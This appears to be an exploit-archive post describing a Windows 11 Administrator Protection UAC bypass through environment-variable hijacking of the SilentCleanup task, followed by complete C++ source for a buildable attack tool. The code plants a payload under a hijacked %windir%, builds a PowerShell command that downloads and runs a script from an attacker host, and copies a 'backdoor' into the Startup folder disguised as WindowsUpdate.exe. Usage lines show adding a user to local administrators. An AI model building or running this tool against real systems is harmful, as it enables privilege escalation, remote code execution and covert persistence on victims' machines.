@@ -1,0 +1,955 @@
+=============================================================================================================================================
+| # Title     : Windows 11 Administrator Protection UAC Bypass Privilege Escalation                                                         |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 145.0.1 (64 bits)                                                            |
+| # Vendor    : System built‑in component. No standalone download available.                                                                |
+=============================================================================================================================================
+
+[+] References : https://packetstorm.news/files/id/212188/ 
+
+[+] Summary : A privilege escalation vulnerability exists in Windows 11 Insider Preview (Build 10.0.27919.1000) 
+			  due to improper handling of user‑controlled environment variables by the Unified Background Process Manager (UBPM) 
+			  when launching elevatable scheduled tasks under Administrator Protection.
+              When a scheduled task such as **SilentCleanup** is triggered, UBPM constructs 
+			  the environment block using the **low-privileged user token**, 
+			  even though the task later runs with the **elevated shadow administrator token**. 
+			  This mismatch allows a normal user to hijack system environment variables such as **%windir%**, 
+			  causing Windows to execute an arbitrary binary as the elevated administrator.
+              As a result, a standard user can silently bypass Administrator Protection and achieve elevation of privilege.
+
+[+] Fix recommendation: UBPM should construct the environment using the elevated token, not the caller’s token.
+
+[+]  Affected Products : Windows 11 Insider Preview** (Build 10.0.27919.1000) with **Administrator Protection** enabled.
+
+[+]  POC : 
+
+          This is a Windows security testing tool designed to bypass User Account Control (UAC) through multiple techniques. 
+          The tool combines core bypass functionality with Metasploit-style features and RPC server capabilities for comprehensive security testing.
+
+Build Instructions:
+
+- Requires Windows SDK 10+
+- Link against: pathcch.lib, taskschd.lib, comsuppw.lib, rpcrt4.lib, advapi32.lib, wintrust.lib
+- Unicode character set
+- Multi-threaded runtime
+- Compile as C++17 or later
+- Security Considerations:
+- Use only in controlled, authorized environments
+- Obtain proper written permissions
+- Document all usage for compliance
+- Keep the tool updated with latest security patches
+
+Usage Examples:
+
+UACBypass.exe --payload C:\tools\payload.exe
+UACBypass.exe --cmd "net localgroup administrators user /add"
+UACBypass.exe --metasploit --payload payload.exe --lhost 192.168.1.100 --lport 4444
+
+[+]  POC : 
+
+//**************************************************************************
+// UAC_BYPASS_COMPLETE.cpp by indoushka
+// Full Integrated UAC Bypass Tool - CORRECTED VERSION
+// Combines: Main Application, RPC Server, Metasploit-style functionality
+//**************************************************************************
+#pragma comment(lib, "pathcch.lib")
+#pragma comment(lib, "taskschd.lib")
+#pragma comment(lib, "comsuppw.lib")
+#pragma comment(lib, "rpcrt4.lib")
+#pragma comment(lib, "advapi32.lib")
+#pragma comment(lib, "wintrust.lib")
+
+#include <windows.h>
+#include <stdio.h>
+#include <string>
+#include <vector>
+#include <memory>
+#include <pathcch.h>
+#include <comdef.h>
+#include <taskschd.h>
+#include <rpc.h>
+#include <sddl.h>
+#include <shlobj.h>
+#include <wincrypt.h>
+#include <wintrust.h>
+#include <softpub.h>
+
+// ==================== CONSTANTS & CONFIGURATION ====================
+
+#define UAC_BYPASS_VERSION "1.1"
+#define MAX_RETRY_COUNT 3
+#define TASK_TIMEOUT_MS 10000
+
+static const GUID RPC_INTERFACE_GUID = 
+{ 0x201ef99a, 0x7fa0, 0x444c, { 0x93, 0x99, 0x19, 0xba, 0x84, 0xf1, 0x2a, 0x1a } };
+
+// ==================== ENUMERATIONS & STRUCTURES ====================
+
+enum BypassTechnique {
+    TECHNIQUE_SCHEDULED_TASK = 0,
+    TECHNIQUE_ENVIRONMENT_MANIPULATION,
+    TECHNIQUE_RPC_ELEVATION,
+    TECHNIQUE_COM_HIJACKING
+};
+
+enum ExecutionMode {
+    MODE_STANDALONE = 0,
+    MODE_METASPLOIT,
+    MODE_SERVICE,
+    MODE_PERSISTENCE
+};
+
+struct SystemContext {
+    bool isElevated;
+    bool isUACEnabled;
+    std::string architecture;
+    std::string windowsVersion;
+    std::vector<BypassTechnique> availableTechniques;
+};
+
+struct PayloadConfig {
+    std::wstring payloadPath;
+    std::wstring arguments;
+    bool hidden;
+    bool waitForCompletion;
+};
+
+// ==================== CORE UTILITY CLASSES ====================
+
+class ScopedRegHandle {
+private:
+    HKEY _handle{ nullptr };
+
+public:
+    ScopedRegHandle() = default;
+    explicit ScopedRegHandle(HKEY handle) : _handle(handle) {}
+    
+    ~ScopedRegHandle() {
+        if (_handle && _handle != INVALID_HANDLE_VALUE) {
+            RegCloseKey(_handle);
+        }
+    }
+    
+    ScopedRegHandle(const ScopedRegHandle&) = delete;
+    ScopedRegHandle& operator=(const ScopedRegHandle&) = delete;
+    
+    ScopedRegHandle(ScopedRegHandle&& other) noexcept : _handle(other._handle) {
+        other._handle = nullptr;
+    }
+    
+    ScopedRegHandle& operator=(ScopedRegHandle&& other) noexcept {
+        if (this != &other) {
+            if (_handle && _handle != INVALID_HANDLE_VALUE) {
+                RegCloseKey(_handle);
+            }
+            _handle = other._handle;
+            other._handle = nullptr;
+        }
+        return *this;
+    }
+    
+    HKEY* ptr() { return &_handle; }
+    HKEY get() const { return _handle; }
+    bool valid() const { return _handle != nullptr && _handle != INVALID_HANDLE_VALUE; }
+    HKEY detach() {
+        HKEY ret = _handle;
+        _handle = nullptr;
+        return ret;
+    }
+};
+
+class ScopedHandle {
+private:
+    HANDLE _handle{ nullptr };
+
+public:
+    ScopedHandle() = default;
+    explicit ScopedHandle(HANDLE handle) : _handle(handle) {}
+    
+    ~ScopedHandle() {
+        if (_handle && _handle != INVALID_HANDLE_VALUE) {
+            CloseHandle(_handle);
+        }
+    }
+    
+    ScopedHandle(const ScopedHandle&) = delete;
+    ScopedHandle& operator=(const ScopedHandle&) = delete;
+    
+    ScopedHandle(ScopedHandle&& other) noexcept : _handle(other._handle) {
+        other._handle = nullptr;
+    }
+    
+    ScopedHandle& operator=(ScopedHandle&& other) noexcept {
+        if (this != &other) {
+            if (_handle && _handle != INVALID_HANDLE_VALUE) {
+                CloseHandle(_handle);
+            }
+            _handle = other._handle;
+            other._handle = nullptr;
+        }
+        return *this;
+    }
+    
+    HANDLE get() const { return _handle; }
+    bool valid() const { return _handle != nullptr && _handle != INVALID_HANDLE_VALUE; }
+    HANDLE detach() {
+        HANDLE ret = _handle;
+        _handle = nullptr;
+        return ret;
+    }
+};
+
+class VolatileRegValue {
+private:
+    HKEY _key;
+    std::wstring _name;
+    bool _valid;
+    
+public:
+    VolatileRegValue(HKEY key, LPCWSTR name, const std::wstring& value) : _key(key), _name(name) {
+        _valid = false;
+        LSTATUS status = RegSetValueExW(key, name, 0, REG_SZ, 
+            reinterpret_cast<const BYTE*>(value.c_str()), 
+            (DWORD)((value.size() + 1) * sizeof(wchar_t)));
+        if (status != ERROR_SUCCESS) {
+            printf("[ERROR] Setting registry value %ls: %d\n", name, status);
+            throw std::runtime_error("Registry operation failed");
+        }
+        _valid = true;
+        printf("[SUCCESS] Registry value %ls set\n", name);
+    }
+
+    ~VolatileRegValue() {
+        if (_valid) {
+            RegDeleteValue(_key, _name.c_str());
+            printf("[CLEANUP] Removed registry value %ls\n", _name.c_str());
+        }
+    }
+};
+
+class CoInit {
+private:
+    bool _initialized{false};
+
+public:
+    CoInit() {
+        HRESULT hr = CoInitializeEx(nullptr, COINIT_MULTITHREADED);
+        if (FAILED(hr) && hr != RPC_E_CHANGED_MODE) {
+            printf("[ERROR] COM initialization failed: %08X\n", hr);
+            throw std::runtime_error("COM init failed");
+        }
+        _initialized = true;
+
+        hr = CoInitializeSecurity(
+            nullptr,
+            -1,
+            nullptr,
+            nullptr,
+            RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
+            RPC_C_IMP_LEVEL_IMPERSONATE,
+            nullptr,
+            EOAC_NONE,
+            nullptr);
+            
+        if (FAILED(hr)) {
+            printf("[WARNING] COM security init failed: %08X\n", hr);
+        }
+        
+        printf("[SUCCESS] COM initialized\n");
+    }
+    
+    ~CoInit() {
+        if (_initialized) {
+            CoUninitialize();
+            printf("[CLEANUP] COM uninitialized\n");
+        }
+    }
+};
+
+// ==================== SECURITY UTILITIES ====================
+
+class SecurityUtils {
+public:
+    static bool IsRunningAsAdmin() {
+        BOOL isAdmin = FALSE;
+        PSID adminGroup = nullptr;
+        
+        SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;
+        if (AllocateAndInitializeSid(&ntAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID,
+            DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &adminGroup)) {
+            
+            if (!CheckTokenMembership(nullptr, adminGroup, &isAdmin)) {
+                isAdmin = FALSE;
+            }
+            FreeSid(adminGroup);
+        }
+        
+        return isAdmin != FALSE;
+    }
+    
+    static bool VerifyPayloadSignature(const std::wstring& filePath) {
+        WINTRUST_FILE_INFO fileData = {0};
+        fileData.cbStruct = sizeof(WINTRUST_FILE_INFO);
+        fileData.pcwszFilePath = filePath.c_str();
+        fileData.hFile = nullptr;
+        fileData.pgKnownSubject = nullptr;
+        
+        WINTRUST_DATA trustData = {0};
+        trustData.cbStruct = sizeof(WINTRUST_DATA);
+        trustData.pPolicyCallbackData = nullptr;
+        trustData.pSIPClientData = nullptr;
+        trustData.dwUIChoice = WTD_UI_NONE;
+        trustData.fdwRevocationChecks = WTD_REVOKE_NONE;
+        trustData.dwUnionChoice = WTD_CHOICE_FILE;
+        trustData.pFile = &fileData;
+        trustData.dwStateAction = WTD_STATEACTION_VERIFY;
+        trustData.hWVTStateData = nullptr;
+        trustData.pwszURLReference = nullptr;
+        trustData.dwProvFlags = WTD_SAFER_FLAG;
+        
+        GUID policyGuid = WINTRUST_ACTION_GENERIC_VERIFY_V2;
+        
+        LONG result = WinVerifyTrust(nullptr, &policyGuid, &trustData);
+        
+        trustData.dwStateAction = WTD_STATEACTION_CLOSE;
+        WinVerifyTrust(nullptr, &policyGuid, &trustData);
+        
+        return result == ERROR_SUCCESS;
+    }
+    
+    static std::string GetLastErrorString(DWORD error = 0) {
+        if (error == 0) {
+            error = GetLastError();
+        }
+        if (error == 0) return "No error";
+        
+        LPSTR buffer = nullptr;
+        size_t size = FormatMessageA(
+            FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
+            nullptr, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
+            (LPSTR)&buffer, 0, nullptr);
+        
+        std::string message(buffer, size);
+        LocalFree(buffer);
+        return message;
+    }
+};
+
+// ==================== CORE BYPASS ENGINE ====================
+
+class UACBypassEngine {
+private:
+    SystemContext _context;
+    ExecutionMode _mode;
+    std::wstring _tempDirectory;
+    
+public:
+    UACBypassEngine(ExecutionMode mode = MODE_STANDALONE) : _mode(mode) {
+        AnalyzeSystemContext();
+        CreateTempDirectory();
+    }
+    
+    ~UACBypassEngine() {
+        CleanupArtifacts();
+    }
+    
+    bool ExecuteBypass(const PayloadConfig& payload) {
+        printf("[INFO] Starting UAC bypass sequence...\n");
+        
+        // Verify payload exists
+        if (GetFileAttributes(payload.payloadPath.c_str()) == INVALID_FILE_ATTRIBUTES) {
+            printf("[ERROR] Payload file not found: %ls\n", payload.payloadPath.c_str());
+            return false;
+        }
+        
+        for (int attempt = 0; attempt < MAX_RETRY_COUNT; attempt++) {
+            printf("[ATTEMPT] %d/%d\n", attempt + 1, MAX_RETRY_COUNT);
+            
+            if (ExecuteTechnique(TECHNIQUE_ENVIRONMENT_MANIPULATION, payload)) {
+                printf("[SUCCESS] UAC bypass completed\n");
+                return true;
+            }
+            
+            Sleep(2000); // Wait before retry
+        }
+        
+        printf("[FAILURE] All bypass attempts failed\n");
+        return false;
+    }
+    
+private:
+    void AnalyzeSystemContext() {
+        printf("[INFO] Analyzing system context...\n");
+        
+        _context.isElevated = IsElevated();
+        _context.isUACEnabled = CheckUACEnabled();
+        _context.architecture = DetectArchitecture();
+        _context.windowsVersion = DetectWindowsVersion();
+        
+        // Determine available techniques
+        _context.availableTechniques.push_back(TECHNIQUE_SCHEDULED_TASK);
+        _context.availableTechniques.push_back(TECHNIQUE_ENVIRONMENT_MANIPULATION);
+        
+        if (IsWindows10OrLater()) {
+            _context.availableTechniques.push_back(TECHNIQUE_RPC_ELEVATION);
+        }
+        
+        PrintSystemContext();
+    }
+    
+    bool IsElevated() {
+        HANDLE token = nullptr;
+        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token)) {
+            return false;
+        }
+        
+        ScopedHandle scopedToken(token);
+        TOKEN_ELEVATION elevation;
+        DWORD size;
+        bool result = false;
+        
+        if (GetTokenInformation(token, TokenElevation, &elevation, sizeof(elevation), &size)) {
+            result = (elevation.TokenIsElevated != 0);
+        }
+        
+        return result;
+    }
+    
+    bool CheckUACEnabled() {
+        ScopedRegHandle key;
+        LSTATUS status = RegOpenKeyEx(HKEY_LOCAL_MACHINE,
+            L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
+            0, KEY_READ, key.ptr());
+            
+        if (status != ERROR_SUCCESS) {
+            return false;
+        }
+        
+        DWORD enableLUA = 0;
+        DWORD size = sizeof(enableLUA);
+        status = RegQueryValueEx(key.get(), L"EnableLUA", nullptr, nullptr,
+            reinterpret_cast<LPBYTE>(&enableLUA), &size);
+            
+        return (status == ERROR_SUCCESS && enableLUA == 1);
+    }
+    
+    std::string DetectArchitecture() {
+        SYSTEM_INFO sysInfo;
+        GetNativeSystemInfo(&sysInfo);
+        
+        switch (sysInfo.wProcessorArchitecture) {
+            case PROCESSOR_ARCHITECTURE_AMD64: return "x64";
+            case PROCESSOR_ARCHITECTURE_INTEL: return "x86";
+            case PROCESSOR_ARCHITECTURE_ARM64: return "ARM64";
+            default: return "Unknown";
+        }
+    }
+    
+    std::string DetectWindowsVersion() {
+        OSVERSIONINFOEX osvi = { sizeof(OSVERSIONINFOEX) };
+        if (GetVersionEx((OSVERSIONINFO*)&osvi)) {
+            return std::to_string(osvi.dwMajorVersion) + "." + 
+                   std::to_string(osvi.dwMinorVersion) + "." + 
+                   std::to_string(osvi.dwBuildNumber);
+        }
+        return "Unknown";
+    }
+    
+    bool IsWindows10OrLater() {
+        OSVERSIONINFOEX osvi = { sizeof(OSVERSIONINFOEX) };
+        osvi.dwMajorVersion = 10;
+        osvi.dwMinorVersion = 0;
+        
+        DWORDLONG conditionMask = 0;
+        VER_SET_CONDITION(conditionMask, VER_MAJORVERSION, VER_GREATER_EQUAL);
+        VER_SET_CONDITION(conditionMask, VER_MINORVERSION, VER_GREATER_EQUAL);
+        
+        return VerifyVersionInfo(&osvi, VER_MAJORVERSION | VER_MINORVERSION, conditionMask) != FALSE;
+    }
+    
+    void CreateTempDirectory() {
+        WCHAR tempPath[MAX_PATH];
+        if (GetTempPath(MAX_PATH, tempPath)) {
+            _tempDirectory = std::wstring(tempPath) + L"Microsoft\\System32\\";
+            if (CreateDirectoryRecursive(_tempDirectory)) {
+                printf("[INFO] Temp directory created: %ls\n", _tempDirectory.c_str());
+            } else {
+                printf("[WARNING] Failed to create temp directory\n");
+            }
+        }
+    }
+    
+    bool CreateDirectoryRecursive(const std::wstring& path) {
+        size_t pos = 0;
+        std::wstring currentPath;
+        
+        while ((pos = path.find_first_of(L"\\/", pos + 1)) != std::wstring::npos) {
+            currentPath = path.substr(0, pos);
+            if (!CreateDirectory(currentPath.c_str(), nullptr)) {
+                DWORD err = GetLastError();
+                if (err != ERROR_ALREADY_EXISTS) {
+                    printf("[ERROR] Creating directory %ls: %s\n", 
+                           currentPath.c_str(), SecurityUtils::GetLastErrorString(err).c_str());
+                    return false;
+                }
+            }
+        }
+        
+        if (!CreateDirectory(path.c_str(), nullptr)) {
+            DWORD err = GetLastError();
+            if (err != ERROR_ALREADY_EXISTS) {
+                printf("[ERROR] Creating directory %ls: %s\n", 
+                       path.c_str(), SecurityUtils::GetLastErrorString(err).c_str());
+                return false;
+            }
+        }
+        
+        return true;
+    }
+    
+    bool ExecuteTechnique(BypassTechnique technique, const PayloadConfig& payload) {
+        switch (technique) {
+            case TECHNIQUE_SCHEDULED_TASK:
+                return ExecuteScheduledTaskBypass(payload);
+            case TECHNIQUE_ENVIRONMENT_MANIPULATION:
+                return ExecuteEnvironmentBypass(payload);
+            case TECHNIQUE_RPC_ELEVATION:
+                return ExecuteRPCElevation(payload);
+            default:
+                return false;
+        }
+    }
+    
+    bool ExecuteEnvironmentBypass(const PayloadConfig& payload) {
+        printf("[TECHNIQUE] Environment Manipulation\n");
+        
+        try {
+            // Step 1: Copy payload to temp location
+            std::wstring payloadDest = _tempDirectory + L"cleanmgr.exe";
+            if (!CopyFile(payload.payloadPath.c_str(), payloadDest.c_str(), FALSE)) {
+                DWORD err = GetLastError();
+                printf("[ERROR] Failed to copy payload: %s\n", SecurityUtils::GetLastErrorString(err).c_str());
+                return false;
+            }
+            printf("[SUCCESS] Payload copied to: %ls\n", payloadDest.c_str());
+            
+            // Step 2: Set environment variable
+            ScopedRegHandle key;
+            LSTATUS status = RegOpenKeyEx(HKEY_CURRENT_USER, 
+                L"Environment", 0, KEY_ALL_ACCESS, key.ptr());
+            if (status != ERROR_SUCCESS) {
+                printf("[ERROR] Failed to open environment key: %d\n", status);
+                return false;
+            }
+            
+            std::wstring tempDirParent = _tempDirectory.substr(0, _tempDirectory.find_last_of(L'\\'));
+            VolatileRegValue windirValue(key.get(), L"windir", tempDirParent);
+            
+            // Step 3: Trigger scheduled task
+            return TriggerScheduledTask();
+            
+        } catch (const std::exception& e) {
+            printf("[EXCEPTION] Environment bypass failed: %s\n", e.what());
+            return false;
+        }
+    }
+    
+    bool ExecuteScheduledTaskBypass(const PayloadConfig& payload) {
+        printf("[TECHNIQUE] Scheduled Task Abuse\n");
+        
+        try {
+            CoInit comInit;
+            
+            // Initialize Task Scheduler
+            ITaskService* pService = nullptr;
+            HRESULT hr = CoCreateInstance(CLSID_TaskScheduler, nullptr, 
+                CLSCTX_INPROC_SERVER, IID_ITaskService, (void**)&pService);
+            if (FAILED(hr)) {
+                printf("[ERROR] Failed to create TaskService: %08X\n", hr);
+                return false;
+            }
+            
+            hr = pService->Connect(_variant_t(), _variant_t(), _variant_t(), _variant_t());
+            if (FAILED(hr)) {
+                printf("[ERROR] Failed to connect to TaskService: %08X\n", hr);
+                pService->Release();
+                return false;
+            }
+            
+            // Get DiskCleanup folder
+            ITaskFolder* pRootFolder = nullptr;
+            hr = pService->GetFolder(_bstr_t(L"\\Microsoft\\Windows\\DiskCleanup"), &pRootFolder);
+            if (FAILED(hr)) {
+                printf("[ERROR] Cannot get DiskCleanup folder: %08X\n", hr);
+                pService->Release();
+                return false;
+            }
+            
+            // Get SilentCleanup task
+            IRegisteredTask* pTask = nullptr;
+            hr = pRootFolder->GetTask(_bstr_t(L"SilentCleanup"), &pTask);
+            if (FAILED(hr)) {
+                printf("[ERROR] Cannot get SilentCleanup task: %08X\n", hr);
+                pRootFolder->Release();
+                pService->Release();
+                return false;
+            }
+            
+            // Execute task
+            IRunningTask* pRunningTask = nullptr;
+            hr = pTask->RunEx(_variant_t(), TASK_RUN_IGNORE_CONSTRAINTS, 
+                -1, _bstr_t(payload.arguments.c_str()), &pRunningTask);
+            if (FAILED(hr)) {
+                printf("[ERROR] Failed to run task: %08X\n", hr);
+                pTask->Release();
+                pRootFolder->Release();
+                pService->Release();
+                return false;
+            }
+            
+            printf("[SUCCESS] Scheduled task executed\n");
+            
+            // Cleanup COM objects
+            if (pRunningTask) pRunningTask->Release();
+            if (pTask) pTask->Release();
+            if (pRootFolder) pRootFolder->Release();
+            if (pService) pService->Release();
+            
+            // Wait for completion
+            if (payload.waitForCompletion) {
+                // Simple wait instead of complex COM operations
+                Sleep(5000);
+            }
+            
+            return true;
+            
+        } catch (const _com_error& e) {
+            printf("[COM_ERROR] Scheduled task bypass failed: %ls\n", e.ErrorMessage());
+            return false;
+        }
+    }
+    
+    bool ExecuteRPCElevation(const PayloadConfig& payload) {
+        printf("[TECHNIQUE] RPC Elevation\n");
+        // RPC elevation implementation would go here
+        printf("[INFO] RPC elevation not implemented in this version\n");
+        return false;
+    }
+    
+    bool TriggerScheduledTask() {
+        printf("[INFO] Triggering SilentCleanup task...\n");
+        
+        // Use schtasks command for reliability
+        std::wstring command = L"schtasks /run /tn \"\\Microsoft\\Windows\\DiskCleanup\\SilentCleanup\"";
+        
+        STARTUPINFO si = { sizeof(si) };
+        PROCESS_INFORMATION pi;
+        
+        if (CreateProcess(nullptr, const_cast<LPWSTR>(command.c_str()), 
+            nullptr, nullptr, FALSE, CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) {
+            
+            ScopedHandle process(pi.hProcess);
+            ScopedHandle thread(pi.hThread);
+            
+            WaitForSingleObject(process.get(), TASK_TIMEOUT_MS);
+            
+            DWORD exitCode;
+            GetExitCodeProcess(process.get(), &exitCode);
+            
+            if (exitCode == 0) {
+                printf("[SUCCESS] Task triggered successfully\n");
+                return true;
+            }
+        }
+        
+        printf("[ERROR] Failed to trigger task: %s\n", SecurityUtils::GetLastErrorString().c_str());
+        return false;
+    }
+    
+    void CleanupArtifacts() {
+        printf("[INFO] Cleaning up artifacts...\n");
+        
+        // Remove temp directory
+        if (!_tempDirectory.empty() && _tempDirectory.find(L"Microsoft\\System32") != std::wstring::npos) {
+            std::wstring delCommand = L"cmd /c rmdir /s /q \"" + _tempDirectory + L"\"";
+            STARTUPINFO si = { sizeof(si) };
+            PROCESS_INFORMATION pi;
+            
+            if (CreateProcess(nullptr, const_cast<LPWSTR>(delCommand.c_str()), 
+                nullptr, nullptr, FALSE, CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) {
+                
+                ScopedHandle process(pi.hProcess);
+                ScopedHandle thread(pi.hThread);
+                
+                WaitForSingleObject(process.get(), 5000);
+            }
+        }
+        
+        // Clean registry
+        ScopedRegHandle key;
+        if (RegOpenKeyEx(HKEY_CURRENT_USER, L"Environment", 0, KEY_WRITE, key.ptr()) == ERROR_SUCCESS) {
+            RegDeleteValue(key.get(), L"windir");
+        }
+        
+        printf("[SUCCESS] Cleanup completed\n");
+    }
+    
+    void PrintSystemContext() {
+        printf("=== SYSTEM CONTEXT ===\n");
+        printf("Elevated: %s\n", _context.isElevated ? "Yes" : "No");
+        printf("UAC Enabled: %s\n", _context.isUACEnabled ? "Yes" : "No");
+        printf("Architecture: %s\n", _context.architecture.c_str());
+        printf("Windows Version: %s\n", _context.windowsVersion.c_str());
+        printf("Available Techniques: %zu\n", _context.availableTechniques.size());
+        printf("Running as Admin: %s\n", SecurityUtils::IsRunningAsAdmin() ? "Yes" : "No");
+        printf("======================\n");
+    }
+};
+
+// ==================== RPC SERVER IMPLEMENTATION ====================
+
+// RPC Interface functions (simplified)
+extern "C" {
+    int RAiLaunchAdminProcess( 
+        /* [in] */ handle_t IDL_handle,
+        /* [in] */ const wchar_t *ExecutablePath,
+        /* [in] */ const wchar_t *CommandLine,
+        /* [in] */ int StartFlags,
+        /* [in] */ int CreateFlags,
+        /* [in] */ const wchar_t *CurrentDirectory,
+        /* [in] */ const wchar_t *WindowStation,
+        /* [in] */ const void *StartupInfo,
+        /* [in] */ __int64 hWnd,
+        /* [in] */ int Timeout,
+        /* [out] */ void *ProcessInformation,
+        /* [out] */ int *ElevationType) {
+        
+        printf("[RPC] RAiLaunchAdminProcess called\n");
+        
+        // Implement RPC-based elevation
+        PayloadConfig payload;
+        payload.payloadPath = ExecutablePath ? ExecutablePath : L"";
+        payload.arguments = CommandLine ? CommandLine : L"";
+        payload.hidden = (CreateFlags & CREATE_NO_WINDOW) != 0;
+        payload.waitForCompletion = true;
+        
+        UACBypassEngine engine;
+        bool success = engine.ExecuteBypass(payload);
+        
+        return success ? 0 : -1;
+    }
+    
+    int RAiProcessRunOnce(
+        /* [in] */ handle_t IDL_handle,
+        /* [in] */ const wchar_t *Command,
+        /* [out] */ void *p1) {
+        
+        printf("[RPC] RAiProcessRunOnce called\n");
+        return 0;
+    }
+}
+
+// ==================== METASPLOIT-STYLE FUNCTIONALITY ====================
+
+class MetasploitStyleModule {
+private:
+    UACBypassEngine _engine;
+    
+public:
+    bool Exploit(const std::wstring& payloadPath, const std::wstring& lhost = L"", int lport = 0) {
+        printf("[METASPLOIT] Starting exploitation...\n");
+        
+        // Verify payload exists
+        if (GetFileAttributes(payloadPath.c_str()) == INVALID_FILE_ATTRIBUTES) {
+            printf("[ERROR] Payload file not found: %ls\n", payloadPath.c_str());
+            return false;
+        }
+        
+        PayloadConfig config;
+        config.payloadPath = payloadPath;
+        config.hidden = true;
+        config.waitForCompletion = false;
+        
+        // Add reverse shell arguments if provided
+        if (!lhost.empty() && lport > 0) {
+            config.arguments = L" -c \"IEX(New-Object Net.WebClient).DownloadString('http://" + 
+                lhost + L":" + std::to_wstring(lport) + L"/payload')\"";
+        }
+        
+        return _engine.ExecuteBypass(config);
+    }
+    
+    bool DeployPersistentBackdoor(const std::wstring& backdoorPath) {
+        printf("[PERSISTENCE] Deploying backdoor...\n");
+        
+        // Verify backdoor exists
+        if (GetFileAttributes(backdoorPath.c_str()) == INVALID_FILE_ATTRIBUTES) {
+            printf("[ERROR] Backdoor file not found: %ls\n", backdoorPath.c_str());
+            return false;
+        }
+        
+        // Copy to startup folder
+        WCHAR startupPath[MAX_PATH];
+        if (SUCCEEDED(SHGetFolderPath(nullptr, CSIDL_STARTUP, nullptr, 0, startupPath))) {
+            std::wstring destPath = std::wstring(startupPath) + L"\\WindowsUpdate.exe";
+            
+            if (CopyFile(backdoorPath.c_str(), destPath.c_str(), FALSE)) {
+                printf("[SUCCESS] Backdoor deployed to: %ls\n", destPath.c_str());
+                return true;
+            } else {
+                printf("[ERROR] Failed to copy backdoor: %s\n", 
+                       SecurityUtils::GetLastErrorString().c_str());
+            }
+        } else {
+            printf("[ERROR] Failed to get startup folder path\n");
+        }
+        
+        return false;
+    }
+};
+
+// ==================== MAIN APPLICATION ====================
+
+void PrintBanner() {
+    printf("=========================================\n");
+    printf("    UAC BYPASS TOOL - v%s\n", UAC_BYPASS_VERSION);
+    printf("    Integrated Security Testing Tool\n");
+    printf("    FOR EDUCATIONAL PURPOSES ONLY\n");
+    printf("=========================================\n");
+}
+
+void PrintUsage() {
+    printf("Usage:\n");
+    printf("  UACBypass.exe [options]\n");
+    printf("Options:\n");
+    printf("  --payload PATH       Path to payload executable\n");
+    printf("  --cmd COMMAND        Command to execute with elevated privileges\n");
+    printf("  --metasploit         Enable Metasploit-style operation\n");
+    printf("  --lhost IP           Listen host for reverse shell\n");
+    printf("  --lport PORT         Listen port for reverse shell\n");
+    printf("  --persistent         Deploy persistent backdoor\n");
+    printf("  --cleanup            Clean up artifacts after execution\n");
+    printf("  --help               Show this help message\n");
+    printf("\nSecurity Notes:\n");
+    printf("  - Use only in authorized environments\n");
+    printf("  - Obtain proper permissions before use\n");
+    printf("  - For educational and security testing purposes only\n");
+}
+
+std::wstring GetCurrentExecutablePath() {
+    WCHAR path[MAX_PATH];
+    DWORD len = GetModuleFileName(nullptr, path, MAX_PATH);
+    if (len == 0 || len == MAX_PATH) {
+        printf("[ERROR] Querying process path: %s\n", SecurityUtils::GetLastErrorString().c_str());
+        throw std::runtime_error("Cannot get executable path");
+    }
+    return path;
+}
+
+int wmain(int argc, wchar_t* argv[]) {
+    PrintBanner();
+    
+    // Security warning
+    printf("[SECURITY] This tool should only be used in authorized environments\n");
+    printf("[SECURITY] for legitimate security testing and educational purposes.\n\n");
+    
+    // Parse command line arguments
+    std::wstring payloadPath;
+    std::wstring command;
+    std::wstring lhost;
+    int lport = 0;
+    bool metasploitMode = false;
+    bool persistent = false;
+    
+    for (int i = 1; i < argc; i++) {
+        if (wcscmp(argv[i], L"--payload") == 0 && i + 1 < argc) {
+            payloadPath = argv[++i];
+        } else if (wcscmp(argv[i], L"--cmd") == 0 && i + 1 < argc) {
+            command = argv[++i];
+        } else if (wcscmp(argv[i], L"--metasploit") == 0) {
+            metasploitMode = true;
+        } else if (wcscmp(argv[i], L"--lhost") == 0 && i + 1 < argc) {
+            lhost = argv[++i];
+        } else if (wcscmp(argv[i], L"--lport") == 0 && i + 1 < argc) {
+            lport = _wtoi(argv[++i]);
+        } else if (wcscmp(argv[i], L"--persistent") == 0) {
+            persistent = true;
+        } else if (wcscmp(argv[i], L"--help") == 0) {
+            PrintUsage();
+            return 0;
+        }
+    }
+    
+    try {
+        if (metasploitMode) {
+            // Metasploit-style operation
+            MetasploitStyleModule msfModule;
+            
+            if (!payloadPath.empty()) {
+                if (msfModule.Exploit(payloadPath, lhost, lport)) {
+                    printf("[SUCCESS] Exploitation completed\n");
+                    
+                    if (persistent) {
+                        if (msfModule.DeployPersistentBackdoor(payloadPath)) {
+                            printf("[SUCCESS] Persistence mechanism deployed\n");
+                        } else {
+                            printf("[WARNING] Failed to deploy persistence mechanism\n");
+                        }
+                    }
+                } else {
+                    printf("[FAILURE] Exploitation failed\n");
+                    return 1;
+                }
+            } else {
+                printf("[ERROR] Payload path required for metasploit mode\n");
+                PrintUsage();
+                return 1;
+            }
+        } else {
+            // Standalone operation
+            UACBypassEngine engine;
+            
+            PayloadConfig config;
+            if (!payloadPath.empty()) {
+                config.payloadPath = payloadPath;
+            } else {
+                // Use current executable as payload
+                config.payloadPath = GetCurrentExecutablePath();
+                printf("[INFO] Using current executable as payload: %ls\n", config.payloadPath.c_str());
+            }
+            
+            config.arguments = command;
+            config.hidden = true;
+            config.waitForCompletion = false;
+            
+            if (engine.ExecuteBypass(config)) {
+                printf("[SUCCESS] UAC bypass completed successfully\n");
+            } else {
+                printf("[FAILURE] UAC bypass failed\n");
+                return 1;
+            }
+        }
+        
+        printf("[INFO] Operation completed\n");
+        return 0;
+        
+    } catch (const std::exception& e) {
+        printf("[FATAL] Exception: %s\n", e.what());
+        return 1;
+    } catch (...) {
+        printf("[FATAL] Unknown exception occurred\n");
+        return 1;
+    }
+}
+
